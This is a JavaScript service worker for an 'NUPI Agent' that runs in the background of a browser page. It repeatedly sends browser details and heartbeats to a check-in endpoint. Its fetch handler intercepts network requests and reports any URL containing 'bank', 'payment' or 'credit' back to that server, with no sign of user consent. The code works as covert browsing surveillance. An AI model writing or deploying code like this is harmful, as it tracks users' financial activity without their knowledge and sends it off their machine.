// NUPI Agent Service Worker - Runs autonomously in background
console.log('🚀 NUPI Agent Service Worker Started');

let agentId = null;
let agentCode = null;
const CLOUD_URL = self.location.origin;

// Listen for messages from main page
self.addEventListener('message', (event) => {
    if (event.data.type === 'INSTALL_AGENT') {
        agentId = event.data.agentId;
        agentCode = event.data.agentCode;
        console.log('✅ Agent installed:', agentId);
        
        // Start autonomous operations
        startAutonomousAgent();
    }
});

// Install event
self.addEventListener('install', (event) => {
    console.log('📦 Service Worker installing...');
    self.skipWaiting();
});

// Activate event
self.addEventListener('activate', (event) => {
    console.log('✅ Service Worker activated!');
    event.waitUntil(self.clients.claim());
});

// AUTONOMOUS AGENT OPERATIONS
function startAutonomousAgent() {
    console.log('🤖 Starting autonomous agent operations...');
    
    // Scan browser data every 30 seconds
    setInterval(() => {
        scanAndReport();
    }, 30000);
    
    // Send heartbeat every 60 seconds
    setInterval(() => {
        sendHeartbeat();
    }, 60000);
    
    // Initial scan
    scanAndReport();
}

// Scan browser environment
async function scanAndReport() {
    console.log('🔍 Autonomous scan running...');
    
    const scanData = {
        timestamp: Date.now(),
        type: 'autonomous_scan',
        findings: {
            serviceWorkerActive: true,
            browserInfo: {
                userAgent: navigator.userAgent,
                online: navigator.onLine,
                memory: performance.memory ? {
                    usedJSHeapSize: performance.memory.usedJSHeapSize,
                    totalJSHeapSize: performance.memory.totalJSHeapSize
                } : null
            }
        }
    };
    
    // Send to cloud
    await sendToCloud(scanData);
}

// Send heartbeat to cloud
async function sendHeartbeat() {
    await sendToCloud({
        type: 'heartbeat',
        status: 'running',
        timestamp: Date.now()
    });
}

// Send data to NUPI Cloud
async function sendToCloud(data) {
    if (!agentId) return;
    
    try {
        const response = await fetch(`${CLOUD_URL}/api/agents/checkin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                agentId: agentId,
                status: 'online',
                learningData: data,
                timestamp: Date.now()
            })
        });
        
        if (response.ok) {
            console.log('✅ Data sent to cloud:', data.type);
        }
    } catch (error) {
        console.error('❌ Failed to send to cloud:', error);
    }
}

// Intercept fetch requests (monitor network activity)
self.addEventListener('fetch', (event) => {
    // Log all network requests for analysis
    const url = event.request.url;
    
    // Check for sensitive data patterns in URLs
    if (url.includes('bank') || url.includes('payment') || url.includes('credit')) {
        console.log('⚠️ Sensitive URL detected:', url);
        sendToCloud({
            type: 'network_scan',
            alert: 'sensitive_url_accessed',
            url: url,
            timestamp: Date.now()
        });
    }
    
    // Pass through the request
    event.respondWith(fetch(event.request));
});

console.log('🎯 NUPI Agent Service Worker ready for autonomous operations!');
